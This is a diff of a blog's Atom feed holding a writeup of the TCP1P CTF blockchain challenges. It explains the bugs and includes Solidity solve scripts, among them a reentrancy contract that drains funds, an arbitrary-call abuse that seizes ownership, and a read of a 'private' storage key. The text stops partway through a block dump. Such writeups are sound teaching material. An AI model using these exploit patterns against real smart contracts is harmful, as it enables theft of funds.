@@ -1,4 +1,551 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2021-04-03T16:54:31+03:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">Blog</title><author><name>pop_eax</name><email>pop_eax@localhost.com</email></author><entry><title type="html">googleCTF2020 web challenges writeup</title><link href="http://localhost:4000/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/" rel="alternate" type="text/html" title="googleCTF2020 web challenges writeup" /><published>2020-08-23T16:28:00+03:00</published><updated>2020-08-23T16:28:00+03:00</updated><id>http://localhost:4000/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups</id><content type="html" xml:base="http://localhost:4000/blog/posts/ctf-writeup/web/xss/2020/08/23/googlectf2020-pasteurize-tech-support-challenge-writeups/">&lt;h1 id=&quot;pasteurize&quot;&gt;PASTEURIZE&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2025-09-26T13:35:30+02:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">Blog</title><author><name>pop_eax</name><email>pop_eax@localhost.com</email></author><entry><title type="html">TCP1P-CTF Blockchain writeups</title><link href="http://localhost:4000/blog/posts/2024/10/12/tcp1p-ctf/" rel="alternate" type="text/html" title="TCP1P-CTF Blockchain writeups" /><published>2024-10-12T00:00:00+02:00</published><updated>2024-10-12T00:00:00+02:00</updated><id>http://localhost:4000/blog/posts/2024/10/12/tcp1p-ctf</id><content type="html" xml:base="http://localhost:4000/blog/posts/2024/10/12/tcp1p-ctf/">&lt;p&gt;This weekend I participated in the TCP1P Capture the flag cybersecurity contest and together with my personal CTF team &lt;a href=&quot;https://xatha.org&quot;&gt;Xor and the half adder&lt;/a&gt; we managed to get placed at 15 out of 1110.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/tcp1p-board.png&quot; alt=&quot;scoreboard&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;What caught my interest was mainly the blockchain challenges since it’s rather an obscure technology when it comes to most CTFs.&lt;/p&gt;
+
+&lt;p&gt;To interact with the challenges each player got their own dedicated rpc that they can connect to avoid solution leakage since everything is public on the blockchain
+&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/tcp1p-blockchain-deploy.png&quot; alt=&quot;deployment&quot; /&gt;
+and each contract was deployed using a Setup contract such as the following:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;// SPDX-License-Identifier: MIT
+pragma solidity 0.6.12;
+
+import { HCOIN } from &quot;./HCOIN.sol&quot;;
+
+contract Setup {
+    HCOIN public coin;
+    address player;
+
+    constructor() public payable {
+        require(msg.value == 1 ether);
+        coin = new HCOIN();
+        coin.deposit{value: 1 ether}();
+    }
+
+    function setPlayer(address _player) public {
+      require(_player == msg.sender, &quot;Player must be the same with the sender&quot;);
+      require(_player == tx.origin, &quot;Player must be a valid Wallet/EOA&quot;);
+      player = _player;
+    }
+
+    function isSolved() public view returns (bool) {
+        return coin.balanceOf(player) &amp;gt; 1000 ether; // im rich :D
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;so the goal is to make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isSolved&lt;/code&gt; function return true&lt;/p&gt;
+
+&lt;p&gt;for solving the challenges I have used the &lt;a href=&quot;https://book.getfoundry.sh&quot;&gt;foundry toolkit&lt;/a&gt; mainly because you can write your own exploit scripts in pure solidity which saves a lot of time and gets rid of type conversion errors.&lt;/p&gt;
+
+&lt;h1 id=&quot;babyerc20&quot;&gt;babyERC20&lt;/h1&gt;
+&lt;p&gt;this challenge has a high number of solves so I assume it was a warmup to test the connection to the chain.&lt;/p&gt;
+
+&lt;p&gt;we are given a basic ERC20 contract (the uninteresting parts are shortened to save space)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;pragma solidity 0.6.12; // this version is older than 0.8.0 so the contract is vulnerable to integer overflow
+
+contract HCOIN is Ownable {
+    function deposit() public payable {
+        balanceOf[msg.sender] += msg.value;
+    }
+    function transfer(address _to, uint256 _value) public returns (bool success) {
+        require(_to != address(0), &quot;ERC20: transfer to the zero address&quot;);
+        require(balanceOf[msg.sender] - _value &amp;gt;= 0, &quot;Insufficient Balance&quot;);
+        balanceOf[msg.sender] -= _value;
+        balanceOf[_to] += _value;
+        return true;
+    }
+    function approve(address _spender, uint256 _value) public returns (bool success) {
+        ...
+    }
+    function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
+        require(allowance[_from][msg.sender] &amp;gt;= _value, &quot;Allowance exceeded&quot;);
+        require(_to != address(0), &quot;ERC20: transfer to the zero address&quot;);
+        require(balanceOf[msg.sender] - _value &amp;gt;= 0, &quot;Insufficient Balance&quot;);
+        balanceOf[_from] -= _value;
+        balanceOf[_to] += _value;
+        allowance[_from][msg.sender] -= _value;
+        ...
+    }
+    fallback() external payable {
+        deposit();
+    }
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;so after reading the contract I assumed there’s an integer overflow somewhere in the transfers or the approval but to my surprise when I queried my account balance I saw this:&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;cast balance &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;wallet address&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--rpc-url&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;rpc&amp;gt;&quot;&lt;/span&gt;
+5000000000000000000000 &lt;span class=&quot;c&quot;&gt;# 5000e18&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;so we don’t really need any hacks I can just transfer my ether to the contract
+originally I just transferred 3000 eth to the contract using metamask but for the writeup I made this foundry solve script&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;import {Script, console} from &quot;forge-std/Script.sol&quot;;
+import {Setup} from &quot;../contracts/Setup.sol&quot;;
+import {HCOIN} from &quot;../contracts/HCOIN.sol&quot;;
+contract pwnScript is Script {
+    Setup setup;
+    HCOIN coin;
+
+    function setUp() public {
+        setup = Setup(0x037B6CD5Ad7D49c637be4cfD94572b405f4E0783);
+        coin = HCOIN(setup.coin());
+    }
+
+    function run() public {
+        vm.startBroadcast();
+        setup.setPlayer(msg.sender); //set the player to my address
+        coin.deposit{value: 3000 ether}();
+        console.log(setup.isSolved()); //check if everything is ok
+        vm.stopBroadcast();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/imagesf/tcp1p/babyerc-solve.png&quot; alt=&quot;solve&quot; /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;forge script script/exploit.s.sol &lt;span class=&quot;nt&quot;&gt;--rpc-url&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;rpc&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--private-key&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;your private key&amp;gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;injus-gambit&quot;&gt;Inju’s Gambit&lt;/h1&gt;
+
+&lt;p&gt;This challenge was more of a misc challenge to me.
+but nonetheless the solution was interested
+in this challenge we have 2 contracts:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileged&lt;/code&gt;: contract handling the access control restrictions and the privileges&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChallengeManager&lt;/code&gt;: a contract that grants privileges to other parties&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;the goal in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Setup.sol&lt;/code&gt; was this :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;function isSolved() public view returns(bool){
+        return address(privileged.challengeManager()) == address(0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Luckily &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Privileged.sol&lt;/code&gt; contains this function:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;function fireManager() public onlyOwner{
+        challengeManager = address(0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks easy we just need to bypass the modifier:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;modifier onlyOwner() {
+        if(msg.sender != casinoOwner){
+            revert Privileged_NotHighestPrivileged();
+        }
+        _;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So in order to become the owner we need to interact with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChallengeManager&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;function approach() public payable {
+        if(msg.value != 5 ether){
+            revert CM_NotTheCorrectValue();
+        }
+        if(approached[msg.sender] == true){
+            revert CM_AlreadyApproached();
+        }
+        approached[msg.sender] = true;
+        challenger.push(msg.sender);
+        privileged.mintChallenger(msg.sender);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;we just need to deposit 5 ether to start the challenge
+but the next step is to upgrade our privileges&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
+        //makes sure a valid id is being used
+        if (challengerId &amp;gt; privileged.challengerCounter()){ 
+            revert CM_InvalidIdOfChallenger();
+        }
+        //same as before
+        if(strangerId &amp;gt; privileged.challengerCounter()){
+            revert CM_InvalidIdofStranger();
+        }
+        //you can only challenge using your own account
+        if(privileged.getRequirmenets(challengerId).challenger != msg.sender){
+            revert CM_CanOnlyChangeSelf();
+        }
+
+        //calculates a somewhat random hash using the block.timestamp as a seed
+        uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
+
+        if (gacha == 0){ //upgrade the stranger
+            if(privileged.getRequirmenets(strangerId).isRich == false){
+                privileged.upgradeAttribute(strangerId, true, false, false, false);
+            }else if(privileged.getRequirmenets(strangerId).isImportant == false){
+                privileged.upgradeAttribute(strangerId, true, true, false, false);
+            }else if(privileged.getRequirmenets(strangerId).hasConnection == false){
+                privileged.upgradeAttribute(strangerId, true, true, true, false);
+            }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){
+                privileged.upgradeAttribute(strangerId, true, true, true, true);
+                qualifiedChallengerFound = true;
+                theChallenger = privileged.getRequirmenets(strangerId).challenger;
+            }
+        }else if (gacha == 1){ //upgrade the challenger
+            if(privileged.getRequirmenets(challengerId).isRich == false){
+                privileged.upgradeAttribute(challengerId, true, false, false, false);
+            }else if(privileged.getRequirmenets(challengerId).isImportant == false){
+                privileged.upgradeAttribute(challengerId, true, true, false, false);
+            }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
+                privileged.upgradeAttribute(challengerId, true, true, true, false);
+            }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
+                privileged.upgradeAttribute(challengerId, true, true, true, true);
+                qualifiedChallengerFound = true;
+                theChallenger = privileged.getRequirmenets(challengerId).challenger;
+            }
+        }else if(gacha == 2){ // nuke the challenger
+            privileged.resetAttribute(challengerId);
+            qualifiedChallengerFound = false;
+            theChallenger = address(0);
+        }else{
+            //nuke the strager
+            privileged.resetAttribute(strangerId);
+            qualifiedChallengerFound = false;
+            theChallenger = address(0);
+        }
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;What caught my eye first was that there’s no check whether &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stangerId == challengerId&lt;/code&gt; which implies we can just challenge ourselve and account for the 0 and 1 cases as one.&lt;/p&gt;
+
+&lt;p&gt;So now how can I time this function properly to elevate my privileges ?
+at the beginning I experimented with just randomly spamming &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upgradeChallengerAttribute(myid,myid)&lt;/code&gt; and after a couple of tries I managed to get it through but this solution wasn’t satisfying neither interesting so I wrote a solve script with foundry again :P&lt;/p&gt;
+
+&lt;p&gt;after that we are left with the last part of the ChallengeManager.sol contract:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;bytes32 private masterKey;
+function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
+        if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
+            privileged.setNewCasinoOwner(address(theChallenger));
+        }        
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;YOU: Oh no it’s a private variable what are we gonna dooo ????? &lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;ME: Chillout it’s the blockchain ;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;private is a non-existent term when it comes to the blockchain, we can easily read any value using web3.js&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;rpc&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getStorageAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0x9d9842E37E5e6786D07aa4AD7173488b7D247d9B&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;we read the index 1 because that’s where the masterkey variable is stored in the memory of the smart contract&lt;/p&gt;
+
+&lt;p&gt;and now we put it all together here
+you might have to run it twice if you aren’t lucky enough just due to randomness
+there are better ways to estimate the precise moment but do you really care ??&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;// the setup part was the same as the previous one so I emitted here to save space
+
+function run() public {
+        vm.startBroadcast();
+        if (!ch.approached(msg.sender)){
+            ch.approach{value: 5e18}();
+        }
+        uint256 gacha = uint256(keccak256(abi.encodePacked(address(this), block.timestamp))) % 4;
+        //check 
+        if (gacha == 0 || gacha == 1) {
+            uint i = 0;
+            while (i != 4){
+                ch.upgradeChallengerAttribute(3, 3); //assuming we are the 3rd challenge after the setup script
+                i++;
+            }
+            ch.challengeCurrentOwner(0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559);
+            p.fireManager();
+        }
+        vm.stopBroadcast();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;money-captcha&quot;&gt;Money Captcha&lt;/h1&gt;
+
+&lt;p&gt;The goal here was to drain the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;moneyContract&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;function isSolved() public view returns (bool) {
+        return address(moneyContract).balance == 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see the challenge is the regular reentrancy bug.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;contract Money {
+    // unnecessary code is emitted for better readibility
+    
+    uint256 public immutable secret = uint256(blockhash(block.prevrandao));
+    function save() public payable {
+        require(msg.value &amp;gt; 0, &quot;You don&apos;t have money XP&quot;);
+        balances[msg.sender] += msg.value;
+    }
+
+    //vulnerable function 
+    function load(uint256 userProvidedCaptcha) public { 
+        uint balance = balances[msg.sender];
+        require(balance &amp;gt; 0, &quot;You don&apos;t have money to load XD&quot;);
+
+        uint256 generatedCaptcha = uint256(keccak256(abi.encodePacked(_secret, block.number, block.timestamp)));
+        require(userProvidedCaptcha == generatedCaptcha, &quot;Invalid captcha&quot;);
+        //vulnerable code
+        (bool success,) = msg.sender.call{value: balance}(&quot;&quot;);
+        require(success, &apos;Oh my god, what is that!?&apos;);
+        balances[msg.sender] = 0;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;reentrancy must be exploited by deploying another contract so here’s mine:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;contract Pwner {
+    Money public moneyContract;
+    Captcha public captchaContract;
+    bool public pwned = false;
+    constructor(Money _moneyContract, Captcha _captchaContract) {
+        moneyContract = _moneyContract;
+        captchaContract = _captchaContract;
+        
+    }
+
+    function pwn() public payable{
+        moneyContract.save{value: msg.value}();
+        uint256 captcha = uint256(keccak256(abi.encodePacked(moneyContract.secret(), block.number, block.timestamp)));
+        moneyContract.load(captcha);
+    }
+
+    receive() external payable {
+        //make sure I don&apos;t get stuck at an infinite loop, may not be necessary but better be safe than sorry
+        if (!pwned){
+            pwned = true;
+            uint256 captcha = uint256(keccak256(abi.encodePacked(moneyContract.secret(), block.number, block.timestamp)));
+            moneyContract.load(captcha);
+        }else {
+            pwned = false;
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And that’s it for this challenge&lt;/p&gt;
+
+&lt;h1 id=&quot;executive-problem&quot;&gt;Executive Problem&lt;/h1&gt;
+
+&lt;p&gt;This challenge had 2 contracts:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crain.sol&lt;/code&gt;: basic contract with one restricted function for changing the owner&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CrainExecutive.sol&lt;/code&gt;: Permission contract for managing the ownership of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crain.sol&lt;/code&gt; contract&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;the goal is to gain ownership of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crain.sol&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;function isSolved() public view returns(bool){
+        return crain.crain() != address(this);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;so our target is the CraineExecutive contract initially:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;contract CrainExecutive{
+
+    function claimStartingBonus() public _onlyOnePerEmployee{
+        balanceOf[owner] -= 1e18;
+        balanceOf[msg.sender] += 1e18;
+    }
+
+    function becomeEmployee() public {
+        isEmployee[msg.sender] = true;
+    }
+
+    function becomeManager() public _onlyEmployee{
+        require(balanceOf[msg.sender] &amp;gt;= 1 ether, &quot;Must have at least 1 ether&quot;);
+        require(isEmployee[msg.sender] == true, &quot;Only Employee can be promoted&quot;);
+        isManager[msg.sender] = true;
+    } 
+
+    function becomeExecutive() public {
+        require(isEmployee[msg.sender] == true &amp;amp;&amp;amp; isManager[msg.sender] == true);
+        require(balanceOf[msg.sender] &amp;gt;= 5 ether, &quot;Must be that Rich to become an Executive&quot;);
+        isExecutive[msg.sender] = true;
+    }
+
+    function buyCredit() public payable _onlyEmployee{
+        require(msg.value &amp;gt;= 1 ether, &quot;Minimum is 1 Ether&quot;);
+        uint256 totalBought = msg.value;
+        balanceOf[msg.sender] += totalBought;
+        totalSupply += totalBought;
+    }
+
+    function sellCredit(uint256 _amount) public _onlyEmployee{
+        require(balanceOf[msg.sender] - _amount &amp;gt;= 0, &quot;Not Enough Credit&quot;);
+        uint256 totalSold = _amount;
+        balanceOf[msg.sender] -= totalSold;
+        totalSupply -= totalSold;
+    }
+    //vulnerable function
+    function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{
+        require(to != address(0), &quot;Invalid Recipient&quot;);
+        require(balanceOf[msg.sender] - _amount &amp;gt;= 0, &quot;Not enough Credit&quot;);
+        uint256 totalSent = _amount;
+        balanceOf[msg.sender] -= totalSent;
+        balanceOf[to] += totalSent;
+        //vulnerable code that allows anyone to call any address on behalf of the contract
+        (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message));
+        require(transfered, &quot;Failed to Transfer Credit!&quot;);
+    }
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So we just have to call the functions in the correct order to get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Executive&lt;/code&gt; role afterwards we can abuse 
+the functionality to call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crain.ascendToCrain&lt;/code&gt; function to take over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Crain.sol&lt;/code&gt; contract&lt;/p&gt;
+
+&lt;p&gt;So I put everything in a solve script:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-solidity&quot;&gt;function run() public {
+        Crain crain = setup.crain();
+        CrainExecutive ce = setup.cexe();
+        vm.startBroadcast();
+        ce.becomeEmployee();
+        ce.claimStartingBonus();
+        ce.becomeManager();
+        ce.buyCredit{value: 5 ether}();
+        ce.becomeExecutive();
+        bytes memory data = abi.encodeWithSignature(&quot;ascendToCrain(address)&quot;, msg.sender);
+        ce.transfer(address(crain), 0 ether, data);
+        vm.stopBroadcast();
+    }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h1 id=&quot;minecraft-huh&quot;&gt;Minecraft huh&lt;/h1&gt;
+
+&lt;p&gt;In my opinion this challenge had potential to be much more interesting but it ended up being quite easy
+to solve&lt;/p&gt;
+
+&lt;p&gt;Initially we get the description but without any contracts:
+&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/minercraft-desc.png&quot; alt=&quot;description&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;My first thoughts were whether the authors forgot to add the source code or not, nonethless I started doing basic enumeration using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web3.js&lt;/code&gt; on the chain.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Web3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;web3&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Web3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;http://ctf.tcp1p.team:44555/7d491d19-9706-4dca-a599-43f65aecd053&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The result was quite interesting since the block number was 8 unlike the challenges from before which all had only one block mined.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/pop-eax/blog/raw/gh-pages/images/tcp1p/minercraft-blocks.png&quot; alt=&quot;the blocks&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;so I took a look at the first block after the gensis&lt;/p&gt;
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;eth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;getBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nl&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;0xdea377425bfecf29d3675fedc611d5a0e58133ad07b55b7c10727fcd01706a76&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
